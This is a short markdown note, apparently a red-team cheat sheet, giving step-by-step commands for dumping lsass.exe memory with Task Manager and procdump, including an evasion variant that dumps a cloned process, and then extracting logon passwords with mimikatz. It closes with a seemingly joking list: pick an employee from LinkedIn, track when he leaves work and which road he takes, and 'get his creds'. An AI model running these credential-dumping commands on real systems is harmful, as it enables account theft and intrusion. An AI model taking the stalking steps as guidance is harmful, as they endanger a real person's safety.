# the_new_redteaming_technique

First OF all, Create a minidump of the lsass.exe using task manager (must be running as administrator):

![alt text](https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nQv2zz6p9_9DMKQfx%2F-L_nTRoRHqLqkBWb_aw4%2FScreenshot%20from%202019-03-12%2019-55-27.png?alt=media&token=0c8f45d6-6425-4d5a-8e3f-1f30ff4577ec)

![alt text](https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nQv2zz6p9_9DMKQfx%2F-L_nTYMBz-VWM11dadu6%2FScreenshot%20from%202019-03-12%2019-56-12.png?alt=media&token=f92b493e-f1aa-4a46-8edf-d64eebdd9f65)




Second , Swtich mimikatz context to the minidump:

sekurlsa::minidump C:\Users\ADMINI~1.OFF\AppData\Local\Temp\lsass.DMP
sekurlsa::logonpasswords



![alt text](https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nQv2zz6p9_9DMKQfx%2F-L_nT6tDqGhJv_fdKOnw%2FScreenshot%20from%202019-03-12%2019-54-15.png?alt=media&token=cccc99d5-632c-40aa-903d-d89c21fb1133)







Now it's a time for Procdump

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp

// or avoid reading lsass by dumping a cloned lsass process
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```



![alt text](https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nQv2zz6p9_9DMKQfx%2F-L_nX2I6LfCsWLSkjzwg%2FScreenshot%20from%202019-03-12%2020-11-28.png?alt=media&token=43e85fd4-36bf-43ba-9fd9-62d43712e1e8)




![alt text](https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nQv2zz6p9_9DMKQfx%2F-L_nXVaJRSNnJZayxbL_%2FScreenshot%20from%202019-03-12%2020-13-25.png?alt=media&token=4e87b3ef-c690-4b43-b3f6-0ba244495398)






After doing all of the above steps, you need to do the following steps: 

1- try to figure the needed employee from Linkedin profile of the company 
2- try to know when the employee will leave the work and which road he will take 
3- use this technique to get his creds 

![alt text](https://i.ibb.co/vQVQXkQ/279407320-359224712933498-202643383967457168-n.jpg)




PS : all screen shots are from https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz
